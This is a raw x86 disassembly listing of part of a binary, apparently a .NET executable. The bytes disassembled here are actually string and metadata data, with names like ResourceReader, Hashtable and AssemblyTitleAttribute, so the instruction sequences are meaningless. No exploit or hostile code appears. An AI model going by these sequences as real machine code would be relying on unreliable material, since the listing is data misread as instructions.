  4072ee:	inc    ecx
  4072ef:	fs jbe 0x407353
  4072f2:	jo     0x40735d
  4072f4:	xor    esi,DWORD PTR [edx]
  4072f6:	add    BYTE PTR [ebx+0x6f],al
  4072f9:	ins    DWORD PTR es:[edi],dx
  4072fa:	arpl   WORD PTR [esp+ebp*2+0x33],si
  4072fe:	xor    al,BYTE PTR [eax]
  407300:	inc    ebx
  407301:	outs   dx,DWORD PTR ds:[esi]
  407302:	ins    DWORD PTR es:[edi],dx
  407303:	fs ins BYTE PTR es:[edi],dx
  407305:	xor    esi,DWORD PTR [bp+si]
  407308:	add    BYTE PTR [edi+0x64],al
  40730b:	imul   esi,DWORD PTR [ebx],0x64470032
  407311:	imul   esi,DWORD PTR [eax+0x6c],0x48007375
  407318:	push   0x6c727463
  40731d:	add    BYTE PTR [ecx+0x6d],cl
  407320:	ins    DWORD PTR es:[edi],dx
  407321:	xor    esi,DWORD PTR [edx]
  407323:	add    BYTE PTR [ebx+0x65],cl
  407326:	jb     0x407396
  407328:	gs ins BYTE PTR es:[edi],dx
  40732a:	xor    esi,DWORD PTR [edx]
  40732c:	add    BYTE PTR [edi+ebp*2+0x61],cl
  407330:	fs jo  0x407398
  407333:	jb     0x40739b
  407335:	add    BYTE PTR [ebp+0x73],cl
  407338:	arpl   WORD PTR [edi+0x72],bp
  40733b:	gs add BYTE PTR gs:[ebp+0x73],cl
  407340:	arpl   WORD PTR [edi+0x72],bp
  407343:	ja     0x4073b0
  407345:	jae    0x407347
  407347:	dec    ebp
  407348:	jae    0x4073b3
  40734a:	add    BYTE PTR [ebp+0x71],cl
  40734d:	jb     0x4073c3
  40734f:	add    BYTE PTR [esi+0x74],cl
  407352:	fs ins BYTE PTR es:[edi],dx
  407354:	ins    BYTE PTR es:[edi],dx
  407355:	add    BYTE PTR [edi+0x6c],cl
  407358:	xor    esi,DWORD PTR gs:[edx]
  40735b:	add    BYTE PTR [edi+0x6c],cl
  40735e:	gs popa 
  407360:	arpl   WORD PTR [ebx+0x0],sp
  407363:	dec    edi
  407364:	ins    BYTE PTR es:[edi],dx
  407365:	gs popa 
  407367:	jne    0x4073dd
  407369:	xor    esi,DWORD PTR [edx]
  40736b:	add    BYTE PTR [edi+0x6c],cl
  40736e:	gs jo  0x4073e3
  407371:	outs   dx,DWORD PTR ds:[esi]
  407372:	xor    esi,DWORD PTR [edx]
  407374:	add    BYTE PTR [eax+0x65],dl
  407377:	jb     0x4073df
  407379:	inc    ebx
  40737a:	outs   dx,DWORD PTR ds:[esi]
  40737b:	jne    0x4073eb
  40737d:	je     0x4073e4
  40737f:	jb     0x407381
  407381:	push   eax
  407382:	outs   dx,DWORD PTR ds:[esi]
  407383:	ja     0x4073f7
  407385:	jo     0x4073f9
  407387:	outs   dx,DWORD PTR ds:[esi]
  407388:	data16 add BYTE PTR [eax+0x73],dl
  40738c:	popa   
  40738d:	jo     0x4073f8
  40738f:	add    BYTE PTR [ebx+0x68],dl
  407392:	gs ins BYTE PTR es:[edi],dx
  407394:	ins    BYTE PTR es:[edi],dx
  407395:	xor    esi,DWORD PTR [edx]
  407397:	add    BYTE PTR [ebx+0x68],dl
  40739a:	outs   dx,WORD PTR ds:[esi]
  40739c:	ins    BYTE PTR es:[edi],dx
  40739d:	fs gs jb 0x4073a1
  4073a1:	push   ebp
  4073a2:	jae    0x407409
  4073a4:	jb     0x4073d9
  4073a6:	xor    al,BYTE PTR [eax]
  4073a8:	push   ebp
  4073a9:	js     0x40741f
  4073ab:	push   0x656d65
  4073b0:	push   edi
  4073b1:	imul   ebp,DWORD PTR [esi+0x4d],0x6957004d
  4073b8:	outs   dx,BYTE PTR ds:[esi]
  4073b9:	jae    0x40742b
  4073bb:	outs   dx,DWORD PTR ds:[esi]
  4073bc:	outs   dx,DWORD PTR ds:[esi]
  4073bd:	ins    BYTE PTR es:[edi],dx
  4073be:	add    BYTE PTR [edi+0x74],dl
  4073c1:	jae    0x407424
  4073c3:	jo     0x40742e
  4073c5:	xor    esi,DWORD PTR [edx]
  4073c7:	add    BYTE PTR [esi+0x73],dl
  4073ca:	popa   
  4073cb:	jae    0x407440
  4073cd:	gs jb  0x407444
  4073d0:	add    BYTE PTR [ebx+0x68],dl
  4073d3:	ins    BYTE PTR es:[edi],dx
  4073d4:	ja     0x407437
  4073d6:	jo     0x407441
  4073d8:	add    BYTE PTR [ebx+0x72],al
  4073db:	jns    0x40744d
  4073dd:	je     0x407412
  4073df:	xor    al,BYTE PTR [eax]
  4073e1:	dec    edi
  4073e2:	bound  esp,QWORD PTR fs:[ebx+0x33]
  4073e6:	xor    al,BYTE PTR [eax]
  4073e8:	push   ebx
  4073e9:	dec    esi
  4073ea:	dec    ecx
  4073eb:	add    BYTE PTR [edi+0x63],cl
  4073ee:	imul   eax,DWORD PTR [esp+ebp*2+0x6c],0x61724f00
  4073f6:	dec    ebp
  4073f7:	je     0x40746c
  4073f9:	inc    esp
  4073fa:	ins    BYTE PTR es:[edi],dx
  4073fb:	ins    BYTE PTR es:[edi],dx
  4073fc:	add    BYTE PTR [ebp+0x72],ah
  4073ff:	jb     0x407470
  407401:	jb     0x407446
  407403:	outs   dx,DWORD PTR ds:[esi]
  407404:	fs add BYTE PTR gs:[ebp+0x72],ah
  407409:	jb     0x40747a
  40740b:	jb     0x407480
  40740d:	add    BYTE PTR [edi+0x61],dh
  407410:	jb     0x407480
  407412:	imul   ebp,DWORD PTR [esi+0x67],0x79530073
  407419:	jae    0x40748f
  40741b:	gs ins DWORD PTR es:[edi],dx
  40741d:	cs inc ebx
  40741f:	outs   dx,DWORD PTR ds:[esi]
  407420:	ins    BYTE PTR es:[edi],dx
  407421:	ins    BYTE PTR es:[edi],dx
  407422:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407427:	outs   dx,BYTE PTR ds:[esi]
  407428:	jae    0x40742a
  40742a:	inc    ecx
  40742b:	jb     0x40749f
  40742d:	popa   
  40742e:	jns    0x40747c
  407430:	imul   esi,DWORD PTR [ebx+0x74],0x73614800
  407437:	push   0x6c626174
  40743c:	add    BYTE PTR gs:[edx+0x65],dh
  407440:	jae    0x4074b1
  407442:	jne    0x4074b6
  407444:	arpl   WORD PTR [ebp+0x73],sp
  407447:	dec    eax
  407448:	popa   
  407449:	jae    0x4074b3
  40744b:	push   esp
  40744c:	popa   
  40744d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  407451:	push   ebx
  407452:	jns    0x4074c7
  407454:	je     0x4074bb
  407456:	ins    DWORD PTR es:[edi],dx
  407457:	cs inc ebx
  407459:	outs   dx,DWORD PTR ds:[esi]
  40745a:	ins    BYTE PTR es:[edi],dx
  40745b:	ins    BYTE PTR es:[edi],dx
  40745c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407461:	outs   dx,BYTE PTR ds:[esi]
  407462:	jae    0x407492
  407464:	inc    edi
  407465:	outs   dx,BYTE PTR gs:[esi]
  407467:	gs jb  0x4074d3
  40746a:	arpl   WORD PTR [eax],ax
  40746c:	dec    esp
  40746d:	imul   esi,DWORD PTR [ebx+0x74],0x53003160
  407474:	jns    0x4074e9
  407476:	je     0x4074dd
  407478:	ins    DWORD PTR es:[edi],dx
  407479:	cs push edx
  40747b:	gs data16 ins BYTE PTR es:[edi],dx
  40747e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407483:	outs   dx,BYTE PTR ds:[esi]
  407484:	add    BYTE PTR [ecx+0x73],al
  407487:	jae    0x4074ee
  407489:	ins    DWORD PTR es:[edi],dx
  40748a:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  40748e:	popa   
  40748f:	ins    DWORD PTR es:[edi],dx
  407490:	add    BYTE PTR gs:[ecx+0x73],ah
  407494:	jae    0x4074fb
  407496:	ins    DWORD PTR es:[edi],dx
  407497:	bound  ebp,QWORD PTR [ecx+edi*2+0x4c]
  40749b:	imul   esi,DWORD PTR [ebx+0x74],0x64644100
  4074a2:	push   edx
  4074a3:	gs jae 0x407515
  4074a6:	jne    0x40751a
  4074a8:	arpl   WORD PTR [ebp+0x0],sp
  4074ab:	inc    ebp
  4074ac:	jb     0x407520
  4074ae:	outs   dx,DWORD PTR ds:[esi]
  4074af:	jb     0x4074b1
  4074b1:	push   edi
  4074b2:	popa   
  4074b3:	jb     0x407523
  4074b5:	imul   ebp,DWORD PTR [esi+0x67],0x74654700
  4074bc:	inc    esi
  4074bd:	outs   dx,DWORD PTR ds:[esi]
  4074be:	jb     0x40752d
  4074c0:	popa   
  4074c1:	je     0x4074c3
  4074c3:	dec    ebp
  4074c4:	popa   
  4074c5:	imul   ebp,DWORD PTR [esi+0x0],0x52746547
  4074cc:	gs jae 0x40753e
  4074cf:	jne    0x407543
  4074d1:	arpl   WORD PTR [ebp+0x46],sp
  4074d4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  4074dc:	push   esi
  4074dd:	popa   
  4074de:	ins    BYTE PTR es:[edi],dx
  4074df:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x72756f73
  4074e7:	arpl   WORD PTR [ebp+0x46],sp
  4074ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  4074f2:	push   eax
  4074f3:	jb     0x407564
  4074f5:	arpl   WORD PTR [ebp+0x73],sp
  4074f8:	jae    0x407540
  4074fa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x65737341
  407502:	ins    DWORD PTR es:[edi],dx
  407503:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407507:	push   edx
  407508:	gs jae 0x40757a
  40750b:	ins    BYTE PTR es:[edi],dx
  40750c:	jbe    0x407573
  40750e:	inc    ebp
  40750f:	jbe    0x407576
  407511:	outs   dx,BYTE PTR ds:[esi]
  407512:	je     0x407555
  407514:	jb     0x40757d
  407516:	jae    0x407518
  407518:	push   edx
  407519:	gs jae 0x40758b
  40751c:	ins    BYTE PTR es:[edi],dx
  40751d:	jbe    0x407584
  40751f:	push   edx
  407520:	gs data16 gs jb 0x40758a
  407525:	outs   dx,BYTE PTR ds:[esi]
  407526:	arpl   WORD PTR [ebp+0x41],sp
  407529:	jae    0x40759e
  40752b:	gs ins DWORD PTR es:[edi],dx
  40752d:	bound  ebp,QWORD PTR [ecx+edi*2+0x48]
  407531:	popa   
  407532:	outs   dx,BYTE PTR ds:[esi]
  407533:	fs ins BYTE PTR es:[edi],dx
  407535:	gs jb  0x407538
  407538:	inc    ebx
  407539:	jb     0x4075a0
  40753b:	popa   
  40753c:	je     0x4075a3
  40753e:	push   ebx
  40753f:	je     0x4075b3
  407541:	outs   dx,DWORD PTR ds:[esi]
  407542:	outs   dx,BYTE PTR ds:[esi]
  407543:	ins    BYTE PTR es:[di],dx
  407545:	jns    0x40759b
  407547:	jns    0x4075b9
  407549:	gs fs push edx
  40754c:	gs jae 0x4075be
  40754f:	jne    0x4075c3
  407551:	arpl   WORD PTR [ebp+0x73],sp
  407554:	add    BYTE PTR [edx+0x65],dl
  407557:	popa   
  407558:	fs push edx
  40755a:	gs jae 0x4075cc
  40755d:	jne    0x4075d1
  40755f:	arpl   WORD PTR [ebp+0x73],sp
  407562:	add    BYTE PTR [ecx+0x52],cl
  407565:	gs jae 0x4075d7
  407568:	jne    0x4075dc
  40756a:	arpl   WORD PTR [ebp+0x52],sp
  40756d:	gs popa 
  40756f:	fs gs jb 0x407573
  407573:	push   edx
  407574:	gs popa 
  407576:	fs push esp
  407578:	gs js  0x4075ef
  40757b:	push   edx
  40757c:	gs jae 0x4075ee
  40757f:	jne    0x4075f3
  407581:	arpl   WORD PTR [ebp+0x73],sp
  407584:	add    BYTE PTR [edi+0x72],dl
  407587:	imul   esi,DWORD PTR [ebp+eiz*2+0x52],0x756f7365
  40758f:	jb     0x4075f4
  407591:	gs jae 0x407594
  407594:	dec    ecx
  407595:	push   edx
  407596:	gs jae 0x407608
  407599:	jne    0x40760d
  40759b:	arpl   WORD PTR [ebp+0x57],sp
  40759e:	jb     0x407609
  4075a0:	je     0x407607
  4075a2:	jb     0x4075a4
  4075a4:	push   edi
  4075a5:	jb     0x407610
  4075a7:	je     0x40760e
  4075a9:	push   esp
  4075aa:	gs js  0x407621
  4075ad:	push   edx
  4075ae:	gs jae 0x407620
  4075b1:	jne    0x407625
  4075b3:	arpl   WORD PTR [ebp+0x73],sp
  4075b6:	add    BYTE PTR [edi+0x6c],bl
  4075b9:	popa   
  4075ba:	outs   dx,BYTE PTR ds:[esi]
  4075bb:	addr16 jne 0x40761f
  4075be:	add    BYTE PTR gs:[bx+0x6e],bl
  4075c3:	popa   
  4075c4:	ins    DWORD PTR es:[edi],dx
  4075c5:	gs push ebx
  4075c7:	jo     0x40762a
  4075c9:	arpl   WORD PTR [ebp+0x0],sp
  4075cc:	pop    edi
  4075cd:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  4075d1:	jae    0x407621
  4075d3:	popa   
  4075d4:	ins    DWORD PTR es:[edi],dx
  4075d5:	add    BYTE PTR gs:[edi+0x6f],bl
  4075d9:	jne    0x40764f
  4075db:	jo     0x407652
  4075dd:	je     0x407625
  4075df:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  4075e7:	pop    edi
  4075e8:	imul   ebp,DWORD PTR [esi+0x74],0x616e7265
  4075ef:	ins    BYTE PTR es:[edi],dx
  4075f0:	inc    ebx
  4075f1:	ins    BYTE PTR es:[edi],dx
  4075f2:	popa   
  4075f3:	jae    0x407668
  4075f5:	add    BYTE PTR [edi+0x65],ah
  4075f8:	je     0x407659
  4075fa:	dec    esp
  4075fb:	popa   
  4075fc:	outs   dx,BYTE PTR ds:[esi]
  4075fd:	addr16 jne 0x407661
  407600:	add    BYTE PTR gs:[bx+0x65],ah
  407605:	je     0x407666
  407607:	dec    esi
  407608:	popa   
  407609:	ins    DWORD PTR es:[edi],dx
  40760a:	gs push ebx
  40760c:	jo     0x40766f
  40760e:	arpl   WORD PTR [ebp+0x0],sp
  407611:	addr16 gs je 0x407674
  407615:	inc    ebx
  407616:	ins    BYTE PTR es:[edi],dx
  407617:	popa   
  407618:	jae    0x40768d
  40761a:	dec    esi
  40761b:	popa   
  40761c:	ins    DWORD PTR es:[edi],dx
  40761d:	add    BYTE PTR gs:[edi+0x65],ah
  407621:	je     0x407682
  407623:	dec    edi
  407624:	jne    0x40769a
  407626:	jo     0x40769d
  407628:	je     0x407670
  40762a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407632:	addr16 gs je 0x407695
  407636:	dec    ecx
  407637:	outs   dx,BYTE PTR ds:[esi]
  407638:	je     0x40769f
  40763a:	jb     0x4076aa
  40763c:	popa   
  40763d:	ins    BYTE PTR es:[edi],dx
  40763e:	inc    ebx
  40763f:	ins    BYTE PTR es:[edi],dx
  407640:	popa   
  407641:	jae    0x4076b6
  407643:	add    BYTE PTR [ebx+0x65],dh
  407646:	je     0x4076a7
  407648:	dec    ecx
  407649:	outs   dx,BYTE PTR ds:[esi]
  40764a:	je     0x4076b1
  40764c:	jb     0x4076bc
  40764e:	popa   
  40764f:	ins    BYTE PTR es:[edi],dx
  407650:	inc    ebx
  407651:	ins    BYTE PTR es:[edi],dx
  407652:	popa   
  407653:	jae    0x4076c8
  407655:	add    BYTE PTR [ecx+eiz*2+0x6e],cl
  407659:	addr16 jne 0x4076bd
  40765c:	add    BYTE PTR gs:[bp+0x61],cl
  407661:	ins    DWORD PTR es:[edi],dx
  407662:	gs push ebx
  407664:	jo     0x4076c7
  407666:	arpl   WORD PTR [ebp+0x0],sp
  407669:	inc    ebx
  40766a:	ins    BYTE PTR es:[edi],dx
  40766b:	popa   
  40766c:	jae    0x4076e1
  40766e:	dec    esi
  40766f:	popa   
  407670:	ins    DWORD PTR es:[edi],dx
  407671:	add    BYTE PTR gs:[edi+0x75],cl
  407675:	je     0x4076e7
  407677:	jne    0x4076ed
  407679:	inc    esi
  40767a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407682:	dec    ecx
  407683:	outs   dx,BYTE PTR ds:[esi]
  407684:	je     0x4076eb
  407686:	jb     0x4076f6
  407688:	popa   
  407689:	ins    BYTE PTR es:[edi],dx
  40768a:	inc    ebx
  40768b:	ins    BYTE PTR es:[edi],dx
  40768c:	popa   
  40768d:	jae    0x407702
  40768f:	add    BYTE PTR [edi+0x6c],bl
  407692:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  407699:	gs jb  0x40769c
  40769c:	pop    edi
  40769d:	arpl   WORD PTR [edi+0x6c],bp
  4076a0:	add    BYTE PTR [ebx+0x79],dl
  4076a3:	jae    0x407719
  4076a5:	gs ins DWORD PTR es:[edi],dx
  4076a7:	cs push esp
  4076a9:	gs js  0x407720
  4076ac:	add    BYTE PTR [ebp+0x6e],al
  4076af:	arpl   WORD PTR [edi+0x64],bp
  4076b2:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  4076b9:	gs popa 
  4076bb:	ins    DWORD PTR es:[edi],dx
  4076bc:	add    BYTE PTR [edx+0x65],dl
  4076bf:	popa   
  4076c0:	add    BYTE PTR fs:[edx+0x65],dl
  4076c4:	popa   
  4076c5:	fs dec esp
  4076c7:	imul   ebp,DWORD PTR [esi+0x65],0x61655200
  4076ce:	fs push esp
  4076d0:	outs   dx,DWORD PTR ds:[esi]
  4076d1:	inc    ebp
  4076d2:	outs   dx,BYTE PTR ds:[esi]
  4076d3:	add    BYTE PTR fs:[edi+0x65],ah
  4076d7:	je     0x407738
  4076d9:	dec    esp
  4076da:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  4076e1:	gs jb  0x4076e4
  4076e4:	addr16 gs je 0x407747
  4076e8:	dec    esp
  4076e9:	imul   ebp,DWORD PTR [esi+0x65],0x69736f50
  4076f0:	je     0x40775b
  4076f2:	outs   dx,DWORD PTR ds:[esi]
  4076f3:	outs   dx,BYTE PTR ds:[esi]
  4076f4:	add    BYTE PTR [ecx+ebp*2+0x6e],cl
  4076f8:	gs dec esi
  4076fa:	jne    0x407769
  4076fc:	bound  esp,QWORD PTR [ebp+0x72]
  4076ff:	add    BYTE PTR [ecx+ebp*2+0x6e],cl
  407703:	gs push eax
  407705:	outs   dx,DWORD PTR ds:[esi]
  407706:	jae    0x407771
  407708:	je     0x407773
  40770a:	outs   dx,DWORD PTR ds:[esi]
  40770b:	outs   dx,BYTE PTR ds:[esi]
  40770c:	add    BYTE PTR [edi+0x66],bl
  40770f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407717:	pop    edi
  407718:	arpl   WORD PTR [edi+0x6c],bp
  40771b:	jne    0x40778a
  40771d:	outs   dx,BYTE PTR ds:[esi]
  40771e:	add    BYTE PTR [edi+0x65],ah
  407721:	je     0x407782
  407723:	inc    esi
  407724:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40772c:	inc    esi
  40772d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407735:	jbe    0x407798
  407737:	ins    BYTE PTR es:[edi],dx
  407738:	jne    0x40779f
  40773a:	pop    edi
  40773b:	pop    edi
  40773c:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  407740:	je     0x407742
  407742:	pop    eax
  407743:	dec    ebp
  407744:	dec    esp
  407745:	add    BYTE PTR [edx+0x69],al
  407748:	outs   dx,BYTE PTR ds:[esi]
  407749:	popa   
  40774a:	jb     0x4077c5
  40774c:	add    BYTE PTR [esi+0x61],ch
  40774f:	ins    DWORD PTR es:[edi],dx
  407750:	add    BYTE PTR gs:[esi+0x61],dh
  407754:	ins    BYTE PTR es:[edi],dx
  407755:	jne    0x4077bc
  407757:	add    BYTE PTR [ecx+0x64],ch
  40775a:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  40775e:	arpl   WORD PTR [edx+0x69],si
  407761:	jo     0x4077d7
  407763:	imul   ebp,DWORD PTR [edi+0x6e],0x74616300
  40776a:	outs   dx,DWORD PTR gs:[si]
  40776d:	jb     0x4077e8
  40776f:	add    BYTE PTR [ecx+0x72],ah
  407772:	addr16 jae 0x407775
  407775:	push   eax
  407776:	popa   
  407777:	jb     0x4077da
  407779:	ins    DWORD PTR es:[edi],dx
  40777a:	inc    ecx
  40777b:	jb     0x4077ef
  40777d:	popa   
  40777e:	jns    0x4077c1
  407780:	je     0x4077f6
  407782:	jb     0x4077ed
  407784:	bound  esi,QWORD PTR [ebp+0x74]
  407787:	add    BYTE PTR gs:[ecx+0x6e],ch
  40778b:	jo     0x407802
  40778d:	je     0x4077d5
  40778f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407797:	ins    BYTE PTR es:[edi],dx
  407798:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  40779f:	gs jb  0x4077a2
  4077a2:	ins    BYTE PTR es:[edi],dx
  4077a3:	imul   ebp,DWORD PTR [esi+0x65],0x69736f50
  4077aa:	je     0x407815
  4077ac:	outs   dx,DWORD PTR ds:[esi]
  4077ad:	outs   dx,BYTE PTR ds:[esi]
  4077ae:	add    BYTE PTR [ebp+0x65],ch
  4077b1:	jae    0x407826
  4077b3:	popa   
  4077b4:	add    BYTE PTR gs:[di+0x72],ah
  4077b9:	jb     0x40782a
  4077bb:	jb     0x40780b
  4077bd:	jne    0x40782c
  4077bf:	bound  esp,QWORD PTR [ebp+0x72]
  4077c2:	add    BYTE PTR [esi+0x69],ah
  4077c5:	ins    BYTE PTR es:[edi],dx
  4077c6:	gs dec esi
  4077c8:	popa   
  4077c9:	ins    DWORD PTR es:[edi],dx
  4077ca:	add    BYTE PTR gs:[ecx+ebp*2+0x6e],ch
  4077cf:	add    BYTE PTR gs:[ebx+0x6f],ah
  4077d3:	ins    BYTE PTR es:[edi],dx
  4077d4:	jne    0x407843
  4077d6:	outs   dx,BYTE PTR ds:[esi]
  4077d7:	add    BYTE PTR [edi+0x61],dh
  4077da:	jb     0x40784a
  4077dc:	imul   ebp,DWORD PTR [esi+0x67],0x626d754e
  4077e3:	gs jb  0x4077e6
  4077e6:	imul   bp,WORD PTR [ebp+eiz*2+0x6e],0x6d61
  4077ed:	add    BYTE PTR gs:[ecx+0x6e],ch
  4077f1:	inc    esi
  4077f2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4674756f
  4077fa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6f736572
  407802:	jne    0x407876
  407804:	arpl   WORD PTR [ebp+0x43],sp
  407807:	ins    BYTE PTR es:[edi],dx
  407808:	popa   
  407809:	jae    0x40787e
  40780b:	dec    edi
  40780c:	jo     0x407882
  40780e:	imul   ebp,DWORD PTR [edi+0x6e],0x73750073
  407815:	gs push ebx
  407817:	outs   dx,DWORD PTR ds:[esi]
  407818:	jne    0x40788c
  40781a:	arpl   WORD PTR [ebp+0x50],sp
  40781d:	popa   
  40781e:	je     0x407888
  407820:	add    BYTE PTR [ebx+0x65],dh
  407823:	outs   dx,BYTE PTR ds:[esi]
  407824:	fs gs jb 0x407828
  407828:	outs   dx,DWORD PTR ds:[esi]
  407829:	jo     0x40789f
  40782b:	imul   ebp,DWORD PTR [edi+0x6e],0x65720073
  407832:	popa   
  407833:	fs gs jb 0x407837
  407837:	ja     0x4078ab
  407839:	imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x6e616c00
  407841:	addr16 jne 0x4078a5
  407844:	add    BYTE PTR gs:[bp+0x61],ch
  407849:	ins    DWORD PTR es:[edi],dx
  40784a:	gs push ebx
  40784c:	jo     0x4078af
  40784e:	arpl   WORD PTR [ebp+0x0],sp
  407851:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  407855:	jae    0x4078a5
  407857:	popa   
  407858:	ins    DWORD PTR es:[edi],dx
  407859:	add    BYTE PTR gs:[edi+0x75],ch
  40785d:	je     0x4078cf
  40785f:	jne    0x4078d5
  407861:	inc    esi
  407862:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40786a:	imul   esi,DWORD PTR [ebx+0x43],0x7373616c
  407871:	dec    ecx
  407872:	outs   dx,BYTE PTR ds:[esi]
  407873:	je     0x4078da
  407875:	jb     0x4078e5
  407877:	popa   
  407878:	ins    BYTE PTR es:[edi],dx
  407879:	add    BYTE PTR [ebp+0x6e],ah
  40787c:	arpl   WORD PTR [edi+0x64],bp
  40787f:	imul   ebp,DWORD PTR [esi+0x67],0x74656400
  407886:	arpl   WORD PTR gs:[ebp+eax*2+0x6e],si
  40788b:	arpl   WORD PTR [edi+0x64],bp
  40788e:	imul   ebp,DWORD PTR [esi+0x67],0x72747300
  407895:	gs popa 
  407897:	ins    DWORD PTR es:[edi],dx
  407898:	add    BYTE PTR [ebx+0x68],ah
  40789b:	popa   
  40789c:	jb     0x407911
  40789e:	add    BYTE PTR [ebx+0x79],dl
  4078a1:	jae    0x407917
  4078a3:	gs ins DWORD PTR es:[edi],dx
  4078a5:	cs push edx
  4078a7:	jne    0x407917
  4078a9:	je     0x407914
  4078ab:	ins    DWORD PTR es:[edi],dx
  4078ac:	gs cs dec ecx
  4078af:	outs   dx,BYTE PTR ds:[esi]
  4078b0:	je     0x407917
  4078b2:	jb     0x407923
  4078b4:	jo     0x407909
  4078b6:	gs jb  0x40792f
  4078b9:	imul   esp,DWORD PTR [ebx+0x65],0x6e490073
  4078c0:	inc    ecx
  4078c1:	je     0x407937
  4078c3:	jb     0x40792e
  4078c5:	bound  esi,QWORD PTR [ebp+0x74]
  4078c8:	add    BYTE PTR gs:[edi+0x75],cl
  4078cc:	je     0x40790f
  4078ce:	je     0x407944
  4078d0:	jb     0x40793b
  4078d2:	bound  esi,QWORD PTR [ebp+0x74]
  4078d5:	add    BYTE PTR gs:[ecx+0x6e],ch
  4078d9:	fs gs js 0x4078dd
  4078dd:	arpl   WORD PTR [edi+0x75],bp
  4078e0:	outs   dx,BYTE PTR ds:[esi]
  4078e1:	je     0x4078e3
  4078e3:	inc    ebx
  4078e4:	outs   dx,DWORD PTR ds:[esi]
  4078e5:	ins    DWORD PTR es:[edi],dx
  4078e6:	push   esi
  4078e7:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4078ee:	je     0x407964
  4078f0:	jb     0x40795b
  4078f2:	bound  esi,QWORD PTR [ebp+0x74]
  4078f5:	add    BYTE PTR gs:[ebx+0x4c],al
  4078f9:	push   ebx
  4078fa:	inc    ebx
  4078fb:	outs   dx,DWORD PTR ds:[esi]
  4078fc:	ins    DWORD PTR es:[edi],dx
  4078fd:	jo     0x40796b
  4078ff:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  407906:	jb     0x407971
  407908:	bound  esi,QWORD PTR [ebp+0x74]
  40790b:	add    BYTE PTR gs:[ecx+0x73],al
  40790f:	jae    0x407976
  407911:	ins    DWORD PTR es:[edi],dx
  407912:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  407916:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40791e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407925:	jae    0x40799a
  407927:	gs ins DWORD PTR es:[edi],dx
  407929:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40792d:	gs jae 0x407993
  407930:	jb     0x40799b
  407932:	jo     0x4079a8
  407934:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40793b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407942:	jae    0x4079b7
  407944:	gs ins DWORD PTR es:[edi],dx
  407946:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40794a:	gs popaw 
  40794d:	jne    0x4079bb
  40794f:	je     0x407992
  407951:	ins    BYTE PTR es:[edi],dx
  407952:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  407959:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407960:	jae    0x4079d5
  407962:	gs ins DWORD PTR es:[edi],dx
  407964:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  407968:	outs   dx,DWORD PTR ds:[esi]
  407969:	ins    DWORD PTR es:[edi],dx
  40796a:	jo     0x4079cd
  40796c:	outs   dx,BYTE PTR ds:[esi]
  40796d:	jns    0x4079b0
  40796f:	je     0x4079e5
  407971:	jb     0x4079dc
  407973:	bound  esi,QWORD PTR [ebp+0x74]
  407976:	add    BYTE PTR gs:[ecx+0x73],al
  40797a:	jae    0x4079e1
  40797c:	ins    DWORD PTR es:[edi],dx
  40797d:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  407981:	jb     0x4079f2
  407983:	fs jne 0x4079e9
  407986:	je     0x4079c9
  407988:	je     0x4079fe
  40798a:	jb     0x4079f5
  40798c:	bound  esi,QWORD PTR [ebp+0x74]
  40798f:	add    BYTE PTR gs:[ecx+0x73],al
  407993:	jae    0x4079fa
  407995:	ins    DWORD PTR es:[edi],dx
  407996:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40799a:	outs   dx,DWORD PTR ds:[esi]
  40799b:	jo     0x407a16
  40799d:	jb     0x407a08
  40799f:	addr16 push 0x74744174
  4079a5:	jb     0x407a10
  4079a7:	bound  esi,QWORD PTR [ebp+0x74]
  4079aa:	add    BYTE PTR gs:[ecx+0x73],al
  4079ae:	jae    0x407a15
  4079b0:	ins    DWORD PTR es:[edi],dx
  4079b1:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4079b5:	gs jb  0x407a2b
  4079b8:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4079bf:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4079c6:	jae    0x407a3b
  4079c8:	gs ins DWORD PTR es:[edi],dx
  4079ca:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
